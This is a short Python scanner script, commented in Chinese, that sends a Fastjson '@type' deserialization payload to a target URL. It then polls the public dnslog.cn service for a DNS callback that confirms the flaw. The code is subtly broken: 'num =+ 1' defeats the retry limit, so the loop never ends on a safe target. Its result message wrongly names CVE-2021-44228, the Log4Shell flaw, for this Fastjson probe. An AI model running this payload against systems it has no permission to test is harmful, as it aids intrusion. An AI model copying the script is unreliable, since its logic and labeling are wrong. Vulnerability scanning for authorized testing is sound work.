import random
import requests
import re
import time


class fastjson():
    def __init__(self):
        self.a = random.uniform(1, 10)
        with open('../opt/前端传url.txt','r') as file:
            self.url = file.readline()     #获取前端传入url
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"   #构造请求头
        }
        dns_url = f"http://dnslog.cn/getdomain.php?t={self.a}"   #访问dns_log
        response = requests.get(url=dns_url,headers=headers)
        self.res = response.text      #获取dns
        set_cookie = response.headers['Set-Cookie']   #获取Set-Cookie
        agex = ".*(?=;)"
        self.set_c = re.findall(agex,set_cookie)[0]    #获取PHPSESSID用以获取结果
        # print(self.res)
        # print(self.set_c)

    def request_det(self):
        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/json"
        }
        json = {
            "zeo":{
                "@type":"java.net.Inet4Address",
                "val": self.res
            }
        }
        requests.post(url=self.url,headers=header,json=json)
        num = 0
        while True:   #一直循环   
            dns_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Cookie" : self.set_c    #用指定的PHPSESSID获取DNS_log结果
            }
            c = random.uniform(1, 10)
            res_dns_url = f"http://dnslog.cn/getrecords.php?t={c}"
            res = requests.get(url=res_dns_url,headers=dns_headers)
            # print(res.text)
            if self.res in res.text:  
                a = "存在cve-2021-44228漏洞"   
                print(a)
                return a 
            else:
                num =+ 1
                time.sleep(1)
                if num > 10:   #最多10次就退出
                    break


fast = fastjson()
fast.request_det()
